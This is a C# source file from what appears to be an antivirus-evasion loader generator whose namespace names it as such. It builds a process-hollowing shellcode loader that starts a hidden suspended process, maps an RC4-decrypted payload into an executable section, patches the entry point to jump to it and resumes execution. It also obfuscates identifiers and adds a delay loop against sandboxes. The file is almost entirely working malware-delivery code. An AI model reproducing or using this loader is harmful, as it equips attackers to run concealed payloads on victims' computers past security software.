using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    class TP_Process_Hollowing
    {
        string code;

        public TP_Process_Hollowing(String decKey, String encPayload, String proc_name)
        {
            code = @"using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;

namespace yr_var_foobar_49_ccx
{
    public sealed class yr_var_foobar_1_ccx
    {

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;

        [DllImport(""ntdll.dll"", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport(""ntdll.dll"", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport(""Kernel32.dll"", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport(""Kernel32.dll"", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport(""Kernel32.dll"", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);

        [DllImport(""ntdll.dll"", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport(""Kernel32.dll"", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport(""kernel32.dll"")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport(""ntdll.dll"", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);


        [DllImport(""kernel32.dll"", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);


        [DllImport(""kernel32.dll"")]
        static extern uint GetLastError();

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;

        public uint round_to_page(uint size)
        {
            SYSTEM_INFO info = new SYSTEM_INFO();

            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

        const int AttributeSize = 24;

        private bool nt_success(long v)
        {
            return (v >= 0);
        }

        public IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }



        /***
         *  Maps a view of the current section into the process specified in procHandle.
         */
        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;


            var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);

            if (!nt_success(status))
                throw new SystemException(""[x] Something went wrong! "" + status);

            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        /***
         *  Attempts to create an RWX section of the given size 
         */
        public bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            var status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);

            return nt_success(status);
        }



        /***
         *  Maps a view of the section into the current process
         */
        public void yr_var_foobar_8_ccx(uint size)
        {

            var vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
            if (vals.Key == (IntPtr)0)
                throw new SystemException(""[x] Failed to map view of section!"");

            localmap_ = vals.Key;
            localsize_ = vals.Value;

        }

        /***
         * Copies the shellcode buffer into the section 
         */
        public void yr_var_foobar_3_ccx(byte[] buf)
        {
            var lsize = size_;
            if (buf.Length > lsize)
                throw new IndexOutOfRangeException(""[x] Shellcode buffer is too long!"");

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        /***
         *  Create a new process using the binary located at ""path"", starting up suspended.
         */
        public PROCESS_INFORMATION yr_var_foobar_7_ccx(string path)
        {
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

            uint flags = CreateSuspended | DetachedProcess | CreateNoWindow;

            if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, true, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
                throw new SystemException(""[x] Failed to create process!"");


            return procInfo;
        }

        const ulong PatchSize = 0x10;

        /***
         *  Constructs the shellcode patch for the new process entry point. It will build either an x86 or x64 payload based
         *  on the current pointer size.
         *  Ultimately, we will jump to the shellcode payload
         */
        public KeyValuePair<int, IntPtr> yr_var_foobar_8_ccx(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {

                var p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8; // mov eax, <imm4>
                    i++;
                    var val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48; // rex
                    i++;
                    p[i] = 0xb8; // mov rax, <imm8>
                    i++;

                    var val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0; // jmp [r|e]ax
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }


        /**
         * We will locate the entry point for the main module in the remote process for patching.
         */
        private IntPtr yr_var_foobar_9_ccx(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c)); // e_lfanew offset in IMAGE_DOS_HEADERS

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18); // IMAGE_OPTIONAL_HEADER start

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10); // entry point rva

                    var tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    // rva -> va
                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        /**
         *  Locate the module base addresss in the remote process,
         *  read in the first page, and locate the entry point.
         */
        public IntPtr yr_var_foobar_10_ccx(IntPtr hProc)
        {
            var basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            if (!nt_success(success))
                throw new SystemException(""[x] Failed to get process information!"");

            IntPtr readLoc = IntPtr.Zero;
            var addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            if (!ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException(""[x] Failed to read process memory!"");

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            if (!ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException(""[x] Failed to read module start!"");

            return yr_var_foobar_9_ccx(inner_);
        }

        /**
         *  Map our shellcode into the remote (suspended) process,
         *  locate and patch the entry point (so our code will run instead of
         *  the original application), and resume execution.
         */
        public void yr_var_foobar_4_ccx(PROCESS_INFORMATION pInfo)
        {

            var tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
                throw new SystemException(""[x] Failed to map section into target process!"");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            var patch = yr_var_foobar_8_ccx(tmp.Key);

            try
            {

                var pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                if (!WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero)
                    throw new SystemException(""[x] Failed to write patch to start location! "" + GetLastError());
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            var tbuf = new byte[0x1000];
            var nRead = new IntPtr();
            if (!ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead))
                throw new SystemException(""Failed!"");

            var res = ResumeThread(pInfo.hThread);
            if (res == unchecked((uint)-1))
                throw new SystemException(""[x] Failed to restart thread!"");

        }

        public IntPtr GetBuffer()
        {
            return localmap_;
        }
        ~yr_var_foobar_1_ccx()
        {
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);

        }

        /**
         * Given a path to a binary and a buffer of shellcode,
         * 1.) start a new (supended) process
         * 2.) map a view of our shellcode buffer into it
         * 3.) patch the original process entry point
         * 4.) resume execution
         */
        public void Load(string yr_var_foobar_23_ccx, byte[] yr_var_foobar_22_ccx)
        {

            var pinf = yr_var_foobar_7_ccx(yr_var_foobar_23_ccx);
            yr_var_foobar_10_ccx(pinf.hProcess);

            if (!CreateSection((uint)yr_var_foobar_22_ccx.Length))
                throw new SystemException(""[x] Failed to create new section!"");

            yr_var_foobar_8_ccx((uint)yr_var_foobar_22_ccx.Length);

            yr_var_foobar_3_ccx(yr_var_foobar_22_ccx);


            yr_var_foobar_4_ccx(pinf);

            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);

        }

        public yr_var_foobar_1_ccx()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000]; // Reserve a page of scratch space
        }

        public static byte[] yr_var_foobar_16_ccx(byte[] key, byte[] data)
        {
            return yr_var_foobar_12_ccx(key, data).ToArray();
        }

        private static byte[] yr_var_foobar_11_ccx(byte[] key)
        {
            byte[] s = Enumerable.Range(0, 256)
                .Select(i => (byte)i)
                .ToArray();

            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + key[i % key.Length] + s[i]) & 255;

                yr_var_foobar_17_ccx(s, i, j);
            }

            return s;
        }
        private static IEnumerable<byte> yr_var_foobar_12_ccx(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = yr_var_foobar_11_ccx(key);

            int i = 0;
            int j = 0;

            return data.Select((b) =>
            {
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;

                yr_var_foobar_17_ccx(s, i, j);

                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }
        private static void yr_var_foobar_17_ccx(byte[] s, int i, int j)
        {
            byte c = s[i];

            s[i] = s[j];
            s[j] = c;
        }

        public static void Main()
        {
            string yr_var_foobar_13_ccx = """ + encPayload + @""";
            string[] yr_var_foobar_14_ccx = yr_var_foobar_13_ccx.Split(',');
            byte[] yr_var_foobar_15_ccx = new byte[yr_var_foobar_14_ccx.Length];
            for (int i = 0; i < yr_var_foobar_14_ccx.Length; i++)
            {
                byte current = Convert.ToByte(yr_var_foobar_14_ccx[i].ToString());
                yr_var_foobar_15_ccx[i] = current;
            }
            byte[] KEY = { " + decKey +@" };
            byte[] yr_var_foobar_21_ccx = yr_var_foobar_16_ccx(KEY, yr_var_foobar_15_ccx);

            yr_var_foobar_1_ccx yr_var_foobar_2_ccx = new yr_var_foobar_1_ccx();
            yr_var_foobar_2_ccx.Load(""" + proc_name + @""", yr_var_foobar_21_ccx);
        }
    }
}";
        }


        public String GetCode()
        {
            //添加延时代码
            if (Global_Var.delay != 0)
            {
                string delay_temp = @"int z;
for (int j = 0; j < " + Global_Var.delay.ToString() + @"; j++)
{ for (int i = 0; i < 1000000; i++)
		{
			Random rd = new Random();
			z = rd.Next();
			z++;
		}}";
                code = code.Replace(@"//delay_code_here", delay_temp);
            }
            return code;
        }
    }


}
